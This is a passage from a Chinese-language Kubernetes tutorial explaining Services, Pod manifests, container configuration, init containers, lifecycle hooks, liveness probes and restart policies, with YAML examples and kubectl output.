nginx!&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;.......&lt;/body&gt;&lt;/html&gt; 操作二：创建集群外部也可访问的Service 12345678910111213# 上面创建的Service的type类型为ClusterIP，这个ip地址只用集群内部可访问# 如果需要创建外部也可以访问的Service，需要修改type为NodePort[root@master ~]# kubectl expose deploy nginx --name=svc-nginx2 --type=NodePort --port=80 --target-port=80 -n devservice/svc-nginx2 exposed# 此时查看，会发现出现了NodePort类型的Service，而且有一对Port（80:31928/TC）[root@master ~]# kubectl get svc svc-nginx2 -n dev -o wideNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE SELECTORsvc-nginx2 NodePort 10.100.94.0 &lt;none&gt; 80:31928/TCP 9s run=nginx# 接下来就可以通过集群外的主机访问 节点IP:31928访问服务了# 例如在的电脑主机上通过浏览器访问下面的地址http://192.168.5.4:31928/ 删除Service 1[root@master ~]# kubectl delete svc svc-nginx-1 -n dev service &quot;svc-nginx-1&quot; deleted 配置方式 创建一个svc-nginx.yaml，内容如下： 1234567891011121314apiVersion: v1kind: Servicemetadata: name: svc-nginx namespace: devspec: clusterIP: 10.109.179.231 #固定svc的内网ip ports: - port: 80 protocol: TCP targetPort: 80 selector: run: nginx type: ClusterIP 然后就可以执行对应的创建和删除命令了： 创建：kubectl create -f svc-nginx.yaml 删除：kubectl delete -f svc-nginx.yaml 小结 至此，已经掌握了Namespace、Pod、Deployment、Service资源的基本操作，有了这些操作，就可以在kubernetes集群中实现一个服务的简单部署和访问了，但是如果想要更好的使用kubernetes，就需要深入学习这几种资源的细节和原理。 Pod详解Pod介绍Pod结构 每个Pod中都可以包含一个或者多个容器，这些容器可以分为两类： 用户程序所在的容器，数量可多可少 Pause容器，这是每个Pod都会有的一个根容器，它的作用有两个： 可以以它为依据，评估整个Pod的健康状态 可以在根容器上设置Ip地址，其它容器都此Ip（Pod IP），以实现Pod内部的网路通信 1这里是Pod内部的通讯，Pod的之间的通讯采用虚拟二层网络技术来实现，我们当前环境用的是Flannel Pod定义下面是Pod的资源清单： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778apiVersion: v1 #必选，版本号，例如v1kind: Pod #必选，资源类型，例如 Podmetadata: #必选，元数据 name: string #必选，Pod名称 namespace: string #Pod所属的命名空间,默认为&quot;default&quot; labels: #自定义标签列表 - name: string spec: #必选，Pod中容器的详细定义 containers: #必选，Pod中容器列表 - name: string #必选，容器名称 image: string #必选，容器的镜像名称 imagePullPolicy: [ Always|Never|IfNotPresent ] #获取镜像的策略 command: [string] #容器的启动命令列表，如不指定，使用打包时使用的启动命令 args: [string] #容器的启动命令参数列表 workingDir: string #容器的工作目录 volumeMounts: #挂载到容器内部的存储卷配置 - name: string #引用pod定义的共享存储卷的名称，需用volumes[]部分定义的的卷名 mountPath: string #存储卷在容器内mount的绝对路径，应少于512字符 readOnly: boolean #是否为只读模式 ports: #需要暴露的端口库号列表 - name: string #端口的名称 containerPort: int #容器需要监听的端口号 hostPort: int #容器所在主机需要监听的端口号，默认与Container相同 protocol: string #端口协议，支持TCP和UDP，默认TCP env: #容器运行前需设置的环境变量列表 - name: string #环境变量名称 value: string #环境变量的值 resources: #资源限制和请求的设置 limits: #资源限制的设置 cpu: string #Cpu的限制，单位为core数，将用于docker run --cpu-shares参数 memory: string #内存限制，单位可以为Mib/Gib，将用于docker run --memory参数 requests: #资源请求的设置 cpu: string #Cpu请求，容器启动的初始可用数量 memory: string #内存请求,容器启动的初始可用数量 lifecycle: #生命周期钩子 postStart: #容器启动后立即执行此钩子,如果执行失败,会根据重启策略进行重启 preStop: #容器终止前执行此钩子,无论结果如何,容器都会终止 livenessProbe: #对Pod内各容器健康检查的设置，当探测无响应几次后将自动重启该容器 exec: #对Pod容器内检查方式设置为exec方式 command: [string] #exec方式需要制定的命令或脚本 httpGet: #对Pod内个容器健康检查方法设置为HttpGet，需要制定Path、port path: string port: number host: string scheme: string HttpHeaders: - name: string value: string tcpSocket: #对Pod内个容器健康检查方式设置为tcpSocket方式 port: number initialDelaySeconds: 0 #容器启动完成后首次探测的时间，单位为秒 timeoutSeconds: 0 #对容器健康检查探测等待响应的超时时间，单位秒，默认1秒 periodSeconds: 0 #对容器监控检查的定期探测时间设置，单位秒，默认10秒一次 successThreshold: 0 failureThreshold: 0 securityContext: privileged: false restartPolicy: [Always | Never | OnFailure] #Pod的重启策略 nodeName: &lt;string&gt; #设置NodeName表示将该Pod调度到指定到名称的node节点上 nodeSelector: obeject #设置NodeSelector表示将该Pod调度到包含这个label的node上 imagePullSecrets: #Pull镜像时使用的secret名称，以key：secretkey格式指定 - name: string hostNetwork: false #是否使用主机网络模式，默认为false，如果设置为true，表示使用宿主机网络 volumes: #在该pod上定义共享存储卷列表 - name: string #共享存储卷名称 （volumes类型有很多种） emptyDir: {} #类型为emtyDir的存储卷，与Pod同生命周期的一个临时目录。为空值 hostPath: string #类型为hostPath的存储卷，表示挂载Pod所在宿主机的目录 path: string #Pod所在宿主机的目录，将被用于同期中mount的目录 secret: #类型为secret的存储卷，挂载集群与定义的secret对象到容器内部 scretname: string items: - key: string path: string configMap: #类型为configMap的存储卷，挂载预定义的configMap对象到容器内部 name: string items: - key: string path: string 1234567891011121314151617181920212223242526272829303132333435#小提示：# 在这里，可通过一个命令来查看每种资源的可配置项# kubectl explain 资源类型 查看某种资源可以配置的一级属性# kubectl explain 资源类型.属性 查看属性的子属性[root@k8s-master01 ~]# kubectl explain podKIND: PodVERSION: v1FIELDS: apiVersion &lt;string&gt; kind &lt;string&gt; metadata &lt;Object&gt; spec &lt;Object&gt; status &lt;Object&gt;[root@k8s-master01 ~]# kubectl explain pod.metadataKIND: PodVERSION: v1RESOURCE: metadata &lt;Object&gt;FIELDS: annotations &lt;map[string]string&gt; clusterName &lt;string&gt; creationTimestamp &lt;string&gt; deletionGracePeriodSeconds &lt;integer&gt; deletionTimestamp &lt;string&gt; finalizers &lt;[]string&gt; generateName &lt;string&gt; generation &lt;integer&gt; labels &lt;map[string]string&gt; managedFields &lt;[]Object&gt; name &lt;string&gt; namespace &lt;string&gt; ownerReferences &lt;[]Object&gt; resourceVersion &lt;string&gt; selfLink &lt;string&gt; uid &lt;string&gt; 在kubernetes中基本所有资源的一级属性都是一样的，主要包含5部分： apiVersion 版本，由kubernetes内部定义，版本号必须可以用 kubectl api-versions 查询到 kind 类型，由kubernetes内部定义，版本号必须可以用 kubectl api-resources 查询到 metadata 元数据，主要是资源标识和说明，常用的有name、namespace、labels等 spec 描述，这是配置中最重要的一部分，里面是对各种资源配置的详细描述 status 状态信息，里面的内容不需要定义，由kubernetes自动生成 在上面的属性中，spec是接下来研究的重点，继续看下它的常见子属性: containers &lt;[]Object&gt; 容器列表，用于定义容器的详细信息 nodeName 根据nodeName的值将pod调度到指定的Node节点上 nodeSelector &lt;map[]&gt; 根据NodeSelector中定义的信息选择将该Pod调度到包含这些label的Node 上 hostNetwork 是否使用主机网络模式，默认为false，如果设置为true，表示使用宿主机网络 volumes &lt;[]Object&gt; 存储卷，用于定义Pod上面挂在的存储信息 restartPolicy 重启策略，表示Pod在遇到故障的时候的处理策略 Pod配置本小节主要来研究pod.spec.containers属性，这也是pod配置中最为关键的一项配置。 12345678910111213[root@k8s-master01 ~]# kubectl explain pod.spec.containersKIND: PodVERSION: v1RESOURCE: containers &lt;[]Object&gt; # 数组，代表可以有多个容器FIELDS: name &lt;string&gt; # 容器名称 image &lt;string&gt; # 容器需要的镜像地址 imagePullPolicy &lt;string&gt; # 镜像拉取策略 command &lt;[]string&gt; # 容器的启动命令列表，如不指定，使用打包时使用的启动命令 args &lt;[]string&gt; # 容器的启动命令需要的参数列表 env &lt;[]Object&gt; # 容器环境变量的配置 ports &lt;[]Object&gt; # 容器需要暴露的端口号列表 resources &lt;Object&gt; # 资源限制和资源请求的设置 基本配置创建pod-base.yaml文件，内容如下： 12345678910111213apiVersion: v1kind: Podmetadata: name: pod-base namespace: dev labels: user: heimaspec: containers: - name: nginx image: nginx:1.17.1 - name: busybox image: busybox:1.30 上面定义了一个比较简单Pod的配置，里面有两个容器： nginx：用1.17.1版本的nginx镜像创建，（nginx是一个轻量级web容器） busybox：用1.30版本的busybox镜像创建，（busybox是一个小巧的linux命令集合） 1234567891011121314# 创建Pod[root@k8s-master01 pod]# kubectl apply -f pod-base.yamlpod/pod-base created# 查看Pod状况# READY 1/2 : 表示当前Pod中有2个容器，其中1个准备就绪，1个未就绪# RESTARTS : 重启次数，因为有1个容器故障了，Pod一直在重启试图恢复它[root@k8s-master01 pod]# kubectl get pod -n devNAME READY STATUS RESTARTS AGEpod-base 1/2 Running 4 95s# 可以通过describe查看内部的详情# 此时已经运行起来了一个基本的Pod，虽然它暂时有问题[root@k8s-master01 pod]# kubectl describe pod pod-base -n dev 镜像拉取创建pod-imagepullpolicy.yaml文件，内容如下： 123456789101112apiVersion: v1kind: Podmetadata: name: pod-imagepullpolicy namespace: devspec: containers: - name: nginx image: nginx:1.17.1 imagePullPolicy: Never # 用于设置镜像拉取策略 - name: busybox image: busybox:1.30 imagePullPolicy，用于设置镜像拉取策略，kubernetes支持配置三种拉取策略： Always：总是从远程仓库拉取镜像（一直远程下载） IfNotPresent：本地有则使用本地镜像，本地没有则从远程仓库拉取镜像（本地有就本地 本地没远程下载） Never：只使用本地镜像，从不去远程仓库拉取，本地没有就报错 （一直使用本地） 默认值说明： 如果镜像tag为具体版本号， 默认策略是：IfNotPresent 如果镜像tag为：latest（最终版本） ，默认策略是always 12345678910111213141516171819# 创建Pod[root@k8s-master01 pod]# kubectl create -f pod-imagepullpolicy.yamlpod/pod-imagepullpolicy created# 查看Pod详情# 此时明显可以看到nginx镜像有一步Pulling image &quot;nginx:1.17.1&quot;的过程[root@k8s-master01 pod]# kubectl describe pod pod-imagepullpolicy -n dev......Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Scheduled &lt;unknown&gt; default-scheduler Successfully assigned dev/pod-imagePullPolicy to node1 Normal Pulling 32s kubelet, node1 Pulling image &quot;nginx:1.17.1&quot; Normal Pulled 26s kubelet, node1 Successfully pulled image &quot;nginx:1.17.1&quot; Normal Created 26s kubelet, node1 Created container nginx Normal Started 25s kubelet, node1 Started container nginx Normal Pulled 7s (x3 over 25s) kubelet, node1 Container image &quot;busybox:1.30&quot; already present on machine Normal Created 7s (x3 over 25s) kubelet, node1 Created container busybox Normal Started 7s (x3 over 25s) kubelet, node1 Started container busybox 启动命令在前面的案例中，一直有一个问题没有解决，就是的busybox容器一直没有成功运行，那么到底是什么原因导致这个容器的故障呢？ 原来busybox并不是一个程序，而是类似于一个工具类的集合，kubernetes集群启动管理后，它会自动关闭。解决方法就是让其一直在运行，这就用到了command配置。 创建pod-command.yaml文件，内容如下： 123456789101112apiVersion: v1kind: Podmetadata: name: pod-command namespace: devspec: containers: - name: nginx image: nginx:1.17.1 - name: busybox image: busybox:1.30 command: [&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;touch /tmp/hello.txt;while true;do /bin/echo $(date +%T) &gt;&gt; /tmp/hello.txt; sleep 3; done;&quot;] command，用于在pod中的容器初始化完毕之后运行一个命令。 稍微解释下上面命令的意思： “/bin/sh”,”-c”, 使用sh执行命令 touch /tmp/hello.txt; 创建一个/tmp/hello.txt 文件 while true;do /bin/echo $(date +%T) &gt;&gt; /tmp/hello.txt; sleep 3; done; 每隔3秒向文件中写入当前时间 12345678910111213141516171819# 创建Pod[root@k8s-master01 pod]# kubectl create -f pod-command.yamlpod/pod-command created# 查看Pod状态# 此时发现两个pod都正常运行了[root@k8s-master01 pod]# kubectl get pods pod-command -n devNAME READY STATUS RESTARTS AGEpod-command 2/2 Runing 0 2s# 进入pod中的busybox容器，查看文件内容# 补充一个命令: kubectl exec pod名称 -n 命名空间 -it -c 容器名称 /bin/sh 在容器内部执行命令# 使用这个命令就可以进入某个容器的内部，然后进行相关操作了# 比如，可以查看txt文件的内容[root@k8s-master01 pod]# kubectl exec pod-command -n dev -it -c busybox /bin/sh/ # tail -f /tmp/hello.txt14:44:1914:44:2214:44:25 123456特别说明： 通过上面发现command已经可以完成启动命令和传递参数的功能，为什么这里还要提供一个args选项，用于传递参数呢?这其实跟docker有点关系，kubernetes中的command、args两项其实是实现覆盖Dockerfile中ENTRYPOINT的功能。 1 如果command和args均没有写，那么用Dockerfile的配置。 2 如果command写了，但args没有写，那么Dockerfile默认的配置会被忽略，执行输入的command 3 如果command没写，但args写了，那么Dockerfile中配置的ENTRYPOINT的命令会被执行，使用当前args的参数 4 如果command和args都写了，那么Dockerfile的配置被忽略，执行command并追加上args参数 环境变量创建pod-env.yaml文件，内容如下： 123456789101112131415apiVersion: v1kind: Podmetadata: name: pod-env namespace: devspec: containers: - name: busybox image: busybox:1.30 command: [&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;while true;do /bin/echo $(date +%T);sleep 60; done;&quot;] env: # 设置环境变量列表 - name: &quot;username&quot; value: &quot;admin&quot; - name: &quot;password&quot; value: &quot;123456&quot; env，环境变量，用于在pod中的容器设置环境变量。 12345678910# 创建Pod[root@k8s-master01 ~]# kubectl create -f pod-env.yamlpod/pod-env created# 进入容器，输出环境变量[root@k8s-master01 ~]# kubectl exec pod-env -n dev -c busybox -it /bin/sh/ # echo $usernameadmin/ # echo $password123456 这种方式不是很推荐，推荐将这些配置单独存储在配置文件中，这种方式将在后面介绍。 端口设置本小节来介绍容器的端口设置，也就是containers的ports选项。 首先看下ports支持的子选项： 12345678910[root@k8s-master01 ~]# kubectl explain pod.spec.containers.portsKIND: PodVERSION: v1RESOURCE: ports &lt;[]Object&gt;FIELDS: name &lt;string&gt; # 端口名称，如果指定，必须保证name在pod中是唯一的 containerPort&lt;integer&gt; # 容器要监听的端口(0&lt;x&lt;65536) hostPort &lt;integer&gt; # 容器要在主机上公开的端口，如果设置，主机上只能运行容器的一个副本(一般省略) hostIP &lt;string&gt; # 要将外部端口绑定到的主机IP(一般省略) protocol &lt;string&gt; # 端口协议。必须是UDP、TCP或SCTP。默认为“TCP”。 接下来，编写一个测试案例，创建pod-ports.yaml 12345678910111213apiVersion: v1kind: Podmetadata: name: pod-ports namespace: devspec: containers: - name: nginx image: nginx:1.17.1 ports: # 设置容器暴露的端口列表 - name: nginx-port containerPort: 80 protocol: TCP 123456789101112131415161718# 创建Pod[root@k8s-master01 ~]# kubectl create -f pod-ports.yamlpod/pod-ports created# 查看pod# 在下面可以明显看到配置信息[root@k8s-master01 ~]# kubectl get pod pod-ports -n dev -o yaml......spec: containers: - image: nginx:1.17.1 imagePullPolicy: IfNotPresent name: nginx ports: - containerPort: 80 name: nginx-port protocol: TCP...... 访问容器中的程序需要使用的是Podip:containerPort 资源配额容器中的程序要运行，肯定是要占用一定资源的，比如cpu和内存等，如果不对某个容器的资源做限制，那么它就可能吃掉大量资源，导致其它容器无法运行。针对这种情况，kubernetes提供了对内存和cpu的资源进行配额的机制，这种机制主要通过resources选项实现，他有两个子选项： limits：用于限制运行时容器的最大占用资源，当容器占用资源超过limits时会被终止，并进行重启 requests ：用于设置容器需要的最小资源，如果环境资源不够，容器将无法启动 可以通过上面两个选项设置资源的上下限。 接下来，编写一个测试案例，创建pod-resources.yaml 12345678910111213141516apiVersion: v1kind: Podmetadata: name: pod-resources namespace: devspec: containers: - name: nginx image: nginx:1.17.1 resources: # 资源配额 limits: # 限制资源（上限） cpu: &quot;2&quot; # CPU限制，单位是core数 memory: &quot;10Gi&quot; # 内存限制 requests: # 请求资源（下限） cpu: &quot;1&quot; # CPU限制，单位是core数 memory: &quot;10Mi&quot; # 内存限制 在这对cpu和memory的单位做一个说明： cpu：core数，可以为整数或小数 memory： 内存大小，可以使用Gi、Mi、G、M等形式 1234567891011121314151617181920212223242526272829# 运行Pod[root@k8s-master01 ~]# kubectl create -f pod-resources.yamlpod/pod-resources created# 查看发现pod运行正常[root@k8s-master01 ~]# kubectl get pod pod-resources -n devNAME READY STATUS RESTARTS AGE pod-resources 1/1 Running 0 39s # 接下来，停止Pod[root@k8s-master01 ~]# kubectl delete -f pod-resources.yamlpod &quot;pod-resources&quot; deleted# 编辑pod，修改resources.requests.memory的值为10Gi[root@k8s-master01 ~]# vim pod-resources.yaml# 再次启动pod[root@k8s-master01 ~]# kubectl create -f pod-resources.yamlpod/pod-resources created# 查看Pod状态，发现Pod启动失败[root@k8s-master01 ~]# kubectl get pod pod-resources -n dev -o wideNAME READY STATUS RESTARTS AGE pod-resources 0/1 Pending 0 20s # 查看pod详情会发现，如下提示[root@k8s-master01 ~]# kubectl describe pod pod-resources -n dev......Warning FailedScheduling 35s default-scheduler 0/3 nodes are available: 1 node(s) had taint {node-role.kubernetes.io/master: }, that the pod didn't tolerate, 2 Insufficient memory.(内存不足) Pod生命周期我们一般将pod对象从创建至终的这段时间范围称为pod的生命周期，它主要包含下面的过程： pod创建过程 运行初始化容器（init container）过程 运行主容器（main container） 容器启动后钩子（post start）、容器终止前钩子（pre stop） 容器的存活性探测（liveness probe）、就绪性探测（readiness probe） pod终止过程 在整个生命周期中，Pod会出现5种状态（相位），分别如下： 挂起（Pending）：apiserver已经创建了pod资源对象，但它尚未被调度完成或者仍处于下载镜像的过程中 运行中（Running）：pod已经被调度至某节点，并且所有容器都已经被kubelet创建完成 成功（Succeeded）：pod中的所有容器都已经成功终止并且不会被重启 失败（Failed）：所有容器都已经终止，但至少有一个容器终止失败，即容器返回了非0值的退出状态 未知（Unknown）：apiserver无法正常获取到pod对象的状态信息，通常由网络通信失败所导致 创建和终止pod的创建过程 用户通过kubectl或其他api客户端提交需要创建的pod信息给apiServer apiServer开始生成pod对象的信息，并将信息存入etcd，然后返回确认信息至客户端 apiServer开始反映etcd中的pod对象的变化，其它组件使用watch机制来跟踪检查apiServer上的变动 scheduler发现有新的pod对象要创建，开始为Pod分配主机并将结果信息更新至apiServer node节点上的kubelet发现有pod调度过来，尝试调用docker启动容器，并将结果回送至apiServer apiServer将接收到的pod状态信息存入etcd中 pod的终止过程 用户向apiServer发送删除pod对象的命令 apiServcer中的pod对象信息会随着时间的推移而更新，在宽限期内（默认30s），pod被视为dead 将pod标记为terminating状态 kubelet在监控到pod对象转为terminating状态的同时启动pod关闭过程 端点控制器监控到pod对象的关闭行为时将其从所有匹配到此端点的service资源的端点列表中移除 如果当前pod对象定义了preStop钩子处理器，则在其标记为terminating后即会以同步的方式启动执行 pod对象中的容器进程收到停止信号 宽限期结束后，若pod中还存在仍在运行的进程，那么pod对象会收到立即终止的信号 kubelet请求apiServer将此pod资源的宽限期设置为0从而完成删除操作，此时pod对于用户已不可见 初始化容器初始化容器是在pod的主容器启动之前要运行的容器，主要是做一些主容器的前置工作，它具有两大特征： 初始化容器必须运行完成直至结束，若某初始化容器运行失败，那么kubernetes需要重启它直到成功完成 初始化容器必须按照定义的顺序执行，当且仅当前一个成功之后，后面的一个才能运行 初始化容器有很多的应用场景，下面列出的是最常见的几个： 提供主容器镜像中不具备的工具程序或自定义代码 初始化容器要先于应用容器串行启动并运行完成，因此可用于延后应用容器的启动直至其依赖的条件得到满足 接下来做一个案例，模拟下面这个需求： 假设要以主容器来运行nginx，但是要求在运行nginx之前先要能够连接上mysql和redis所在服务器 为了简化测试，事先规定好mysql(192.168.5.4)和redis(192.168.5.5)服务器的地址 创建pod-initcontainer.yaml，内容如下： 12345678910111213141516171819apiVersion: v1kind: Podmetadata: name: pod-initcontainer namespace: devspec: containers: - name: main-container image: nginx:1.17.1 ports: - name: nginx-port containerPort: 80 initContainers: - name: test-mysql image: busybox:1.30 command: ['sh', '-c', 'until ping 192.168.5.14 -c 1 ; do echo waiting for mysql...; sleep 2; done;'] - name: test-redis image: busybox:1.30 command: ['sh', '-c', 'until ping 192.168.5.15 -c 1 ; do echo waiting for reids...; sleep 2; done;'] 12345678910111213141516171819202122232425262728# 创建pod[root@k8s-master01 ~]# kubectl create -f pod-initcontainer.yamlpod/pod-initcontainer created# 查看pod状态# 发现pod卡在启动第一个初始化容器过程中，后面的容器不会运行root@k8s-master01 ~]# kubectl describe pod pod-initcontainer -n dev........Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Scheduled 49s default-scheduler Successfully assigned dev/pod-initcontainer to node1 Normal Pulled 48s kubelet, node1 Container image &quot;busybox:1.30&quot; already present on machine Normal Created 48s kubelet, node1 Created container test-mysql Normal Started 48s kubelet, node1 Started container test-mysql# 动态查看pod[root@k8s-master01 ~]# kubectl get pods pod-initcontainer -n dev -wNAME READY STATUS RESTARTS AGEpod-initcontainer 0/1 Init:0/2 0 15spod-initcontainer 0/1 Init:1/2 0 52spod-initcontainer 0/1 Init:1/2 0 53spod-initcontainer 0/1 PodInitializing 0 89spod-initcontainer 1/1 Running 0 90s# 接下来新开一个shell，为当前服务器新增两个ip，观察pod的变化[root@k8s-master01 ~]# ifconfig ens33:1 192.168.5.14 netmask 255.255.255.0 up[root@k8s-master01 ~]# ifconfig ens33:2 192.168.5.15 netmask 255.255.255.0 up 钩子函数钩子函数能够感知自身生命周期中的事件，并在相应的时刻到来时运行用户指定的程序代码。 kubernetes在主容器的启动之后和停止之前提供了两个钩子函数： post start：容器创建之后执行，如果失败了会重启容器 pre stop ：容器终止之前执行，执行完成之后容器将成功终止，在其完成之前会阻塞删除容器的操作 钩子处理器支持使用下面三种方式定义动作： Exec命令：在容器内执行一次命令 12345678…… lifecycle: postStart: exec: command: - cat - /tmp/healthy…… TCPSocket：在当前容器尝试访问指定的socket 123456…… lifecycle: postStart: tcpSocket: port: 8080…… HTTPGet：在当前容器中向某url发起http请求 123456789…… lifecycle: postStart: httpGet: path: / #URI地址 port: 80 #端口号 host: 192.168.5.3 #主机地址 scheme: HTTP #支持的协议，http或者https…… 接下来，以exec方式为例，演示下钩子函数的使用，创建pod-hook-exec.yaml文件，内容如下： 12345678910111213141516171819apiVersion: v1kind: Podmetadata: name: pod-hook-exec namespace: devspec: containers: - name: main-container image: nginx:1.17.1 ports: - name: nginx-port containerPort: 80 lifecycle: postStart: exec: # 在容器启动的时候执行一个命令，修改掉nginx的默认首页内容 command: [&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;echo postStart... &gt; /usr/share/nginx/html/index.html&quot;] preStop: exec: # 在容器停止之前停止nginx服务 command: [&quot;/usr/sbin/nginx&quot;,&quot;-s&quot;,&quot;quit&quot;] 123456789101112# 创建pod[root@k8s-master01 ~]# kubectl create -f pod-hook-exec.yamlpod/pod-hook-exec created# 查看pod[root@k8s-master01 ~]# kubectl get pods pod-hook-exec -n dev -o wideNAME READY STATUS RESTARTS AGE IP NODE pod-hook-exec 1/1 Running 0 29s 10.244.2.48 node2 # 访问pod[root@k8s-master01 ~]# curl 10.244.2.48postStart... 容器探测容器探测用于检测容器中的应用实例是否正常工作，是保障业务可用性的一种传统机制。如果经过探测，实例的状态不符合预期，那么kubernetes就会把该问题实例” 摘除 “，不承担业务流量。kubernetes提供了两种探针来实现容器探测，分别是： liveness probes：存活性探针，用于检测应用实例当前是否处于正常运行状态，如果不是，k8s会重启容器 readiness probes：就绪性探针，用于检测应用实例当前是否可以接收请求，如果不能，k8s不会转发流量 livenessProbe 决定是否重启容器，readinessProbe 决定是否将请求转发给容器。 上面两种探针目前均支持三种探测方式： Exec命令：在容器内执行一次命令，如果命令执行的退出码为0，则认为程序正常，否则不正常 1234567…… livenessProbe: exec: command: - cat - /tmp/healthy…… TCPSocket：将会尝试访问一个用户容器的端口，如果能够建立这条连接，则认为程序正常，否则不正常 12345…… livenessProbe: tcpSocket: port: 8080…… HTTPGet：调用容器内Web应用的URL，如果返回的状态码在200和399之间，则认为程序正常，否则不正常 12345678…… livenessProbe: httpGet: path: / #URI地址 port: 80 #端口号 host: 127.0.0.1 #主机地址 scheme: HTTP #支持的协议，http或者https…… 下面以liveness probes为例，做几个演示： 方式一：Exec 创建pod-liveness-exec.yaml 123456789101112131415apiVersion: v1kind: Podmetadata: name: pod-liveness-exec namespace: devspec: containers: - name: nginx image: nginx:1.17.1 ports: - name: nginx-port containerPort: 80 livenessProbe: exec: command: [&quot;/bin/cat&quot;,&quot;/tmp/hello.txt&quot;] # 执行一个查看文件的命令 创建pod，观察效果 1234567891011121314151617181920# 创建Pod[root@k8s-master01 ~]# kubectl create -f pod-liveness-exec.yamlpod/pod-liveness-exec created# 查看Pod详情[root@k8s-master01 ~]# kubectl describe pods pod-liveness-exec -n dev...... Normal Created 20s (x2 over 50s) kubelet, node1 Created container nginx Normal Started 20s (x2 over 50s) kubelet, node1 Started container nginx Normal Killing 20s kubelet, node1 Container nginx failed liveness probe, will be restarted Warning Unhealthy 0s (x5 over 40s) kubelet, node1 Liveness probe failed: cat: can't open '/tmp/hello11.txt': No such file or directory # 观察上面的信息就会发现nginx容器启动之后就进行了健康检查# 检查失败之后，容器被kill掉，然后尝试进行重启（这是重启策略的作用，后面讲解）# 稍等一会之后，再观察pod信息，就可以看到RESTARTS不再是0，而是一直增长[root@k8s-master01 ~]# kubectl get pods pod-liveness-exec -n devNAME READY STATUS RESTARTS AGEpod-liveness-exec 0/1 CrashLoopBackOff 2 3m19s# 当然接下来，可以修改成一个存在的文件，比如/tmp/hello.txt，再试，结果就正常了...... 方式二：TCPSocket 创建pod-liveness-tcpsocket.yaml 123456789101112131415apiVersion: v1kind: Podmetadata: name: pod-liveness-tcpsocket namespace: devspec: containers: - name: nginx image: nginx:1.17.1 ports: - name: nginx-port containerPort: 80 livenessProbe: tcpSocket: port: 8080 # 尝试访问8080端口 创建pod，观察效果 1234567891011121314151617181920# 创建Pod[root@k8s-master01 ~]# kubectl create -f pod-liveness-tcpsocket.yamlpod/pod-liveness-tcpsocket created# 查看Pod详情[root@k8s-master01 ~]# kubectl describe pods pod-liveness-tcpsocket -n dev...... Normal Scheduled 31s default-scheduler Successfully assigned dev/pod-liveness-tcpsocket to node2 Normal Pulled &lt;invalid&gt; kubelet, node2 Container image &quot;nginx:1.17.1&quot; already present on machine Normal Created &lt;invalid&gt; kubelet, node2 Created container nginx Normal Started &lt;invalid&gt; kubelet, node2 Started container nginx Warning Unhealthy &lt;invalid&gt; (x2 over &lt;invalid&gt;) kubelet, node2 Liveness probe failed: dial tcp 10.244.2.44:8080: connect: connection refused # 观察上面的信息，发现尝试访问8080端口,但是失败了# 稍等一会之后，再观察pod信息，就可以看到RESTARTS不再是0，而是一直增长[root@k8s-master01 ~]# kubectl get pods pod-liveness-tcpsocket -n devNAME READY STATUS RESTARTS AGEpod-liveness-tcpsocket 0/1 CrashLoopBackOff 2 3m19s# 当然接下来，可以修改成一个可以访问的端口，比如80，再试，结果就正常了...... 方式三：HTTPGet 创建pod-liveness-httpget.yaml 1234567891011121314151617apiVersion: v1kind: Podmetadata: name: pod-liveness-httpget namespace: devspec: containers: - name: nginx image: nginx:1.17.1 ports: - name: nginx-port containerPort: 80 livenessProbe: httpGet: # 其实就是访问http://127.0.0.1:80/hello scheme: HTTP #支持的协议，http或者https port: 80 #端口号 path: /hello #URI地址 创建pod，观察效果 1234567891011121314151617181920# 创建Pod[root@k8s-master01 ~]# kubectl create -f pod-liveness-httpget.yamlpod/pod-liveness-httpget created# 查看Pod详情[root@k8s-master01 ~]# kubectl describe pod pod-liveness-httpget -n dev....... Normal Pulled 6s (x3 over 64s) kubelet, node1 Container image &quot;nginx:1.17.1&quot; already present on machine Normal Created 6s (x3 over 64s) kubelet, node1 Created container nginx Normal Started 6s (x3 over 63s) kubelet, node1 Started container nginx Warning Unhealthy 6s (x6 over 56s) kubelet, node1 Liveness probe failed: HTTP probe failed with statuscode: 404 Normal Killing 6s (x2 over 36s) kubelet, node1 Container nginx failed liveness probe, will be restarted # 观察上面信息，尝试访问路径，但是未找到,出现404错误# 稍等一会之后，再观察pod信息，就可以看到RESTARTS不再是0，而是一直增长[root@k8s-master01 ~]# kubectl get pod pod-liveness-httpget -n devNAME READY STATUS RESTARTS AGEpod-liveness-httpget 1/1 Running 5 3m17s# 当然接下来，可以修改成一个可以访问的路径path，比如/，再试，结果就正常了...... 至此，已经使用liveness Probe演示了三种探测方式，但是查看livenessProbe的子属性，会发现除了这三种方式，还有一些其他的配置，在这里一并解释下： 12345678910[root@k8s-master01 ~]# kubectl explain pod.spec.containers.livenessProbeFIELDS: exec &lt;Object&gt; tcpSocket &lt;Object&gt; httpGet &lt;Object&gt; initialDelaySeconds &lt;integer&gt; # 容器启动后等待多少秒执行第一次探测 timeoutSeconds &lt;integer&gt; # 探测超时时间。默认1秒，最小1秒 periodSeconds &lt;integer&gt; # 执行探测的频率。默认是10秒，最小1秒 failureThreshold &lt;integer&gt; # 连续探测失败多少次才被认定为失败。默认是3。最小值是1 successThreshold &lt;integer&gt; # 连续探测成功多少次才被认定为成功。默认是1 下面稍微配置两个，演示下效果即可： 1234567891011121314151617181920[root@k8s-master01 ~]# more pod-liveness-httpget.yamlapiVersion: v1kind: Podmetadata: name: pod-liveness-httpget namespace: devspec: containers: - name: nginx image: nginx:1.17.1 ports: - name: nginx-port containerPort: 80 livenessProbe: httpGet: scheme: HTTP port: 80 path: / initialDelaySeconds: 30 # 容器启动后30s开始探测 timeoutSeconds: 5 # 探测超时时间为5s 重启策略在上一节中，一旦容器探测出现了问题，kubernetes就会对容器所在的Pod进行重启，其实这是由pod的重启策略决定的，pod的重启策略有 3 种，分别如下： Always ：容器失效时，自动重启该容器，这也是默认值。 OnFailure ： 容器终止运行且退出码不为0时重启 Never ： 不论状态为何，都不重启该容器 